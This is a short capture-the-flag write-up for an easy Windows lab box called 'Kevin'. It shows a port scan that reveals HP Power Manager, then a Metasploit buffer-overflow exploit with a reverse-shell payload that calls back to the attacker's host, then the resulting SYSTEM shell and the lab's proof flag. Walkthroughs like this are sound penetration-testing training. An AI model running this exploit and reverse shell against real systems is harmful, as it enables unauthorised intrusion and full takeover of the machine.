###### tags: `Offsec` `PG Practice` `Easy` `Windows`

# Kevin 
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.203.45 -u 5000 -t 8000 --scripts -- -n -Pn -sVC 

Open 192.168.203.45:80
Open 192.168.203.45:135
Open 192.168.203.45:139
Open 192.168.203.45:445
Open 192.168.203.45:3573
Open 192.168.203.45:3389
Open 192.168.203.45:49153
Open 192.168.203.45:49152
Open 192.168.203.45:49154
Open 192.168.203.45:49155
Open 192.168.203.45:49159
Open 192.168.203.45:49158

PORT      STATE SERVICE            REASON  VERSION
80/tcp    open  http               syn-ack GoAhead WebServer
| http-methods: 
|_  Supported Methods: GET HEAD
| http-title: HP Power Manager
|_Requested resource was http://192.168.203.45/index.asp
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack
3573/tcp  open  tag-ups-1?         syn-ack
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack Microsoft Windows RPC
49158/tcp open  msrpc              syn-ack Microsoft Windows RPC
49159/tcp open  msrpc              syn-ack Microsoft Windows RPC
```

這題是buffer overflow，偷用`msfconsole`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ msfconsole

msf6 > search "HP power manager"

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/windows/http/hp_power_manager_filename       2011-10-19       normal     No     HP Power Manager 'formExportDataLogs' Buffer Overflow
   1  exploit/windows/http/hpe_sim_76_amf_deserialization  2020-12-15       excellent  Yes    HPE Systems Insight Manager AMF Deserialization RCE
   2  exploit/windows/http/hp_power_manager_login          2009-11-04       average    No     Hewlett-Packard Power Manager Administration Buffer Overflow
   
msf6 exploit(windows/http/hp_power_manager_login) > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/hp_power_manager_filename) > set payload windows/shell_reverse_tcp
payload => windows/shell_reverse_tcp
msf6 exploit(windows/http/hp_power_manager_filename) > set RHOSTS 192.168.203.45
RHOSTS => 192.168.203.45
msf6 exploit(windows/http/hp_power_manager_filename) > set LHOST 192.168.45.177
LHOST => 192.168.45.177
msf6 exploit(windows/http/hp_power_manager_filename) > run
```

一進去就是Administrator權限了，在`C:\Users\Administrator\Desktop`得到proof.txt
```
C:\Windows\System32>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>type proof.txt
dff63c300bc6db7d922e98a83100bee6
```
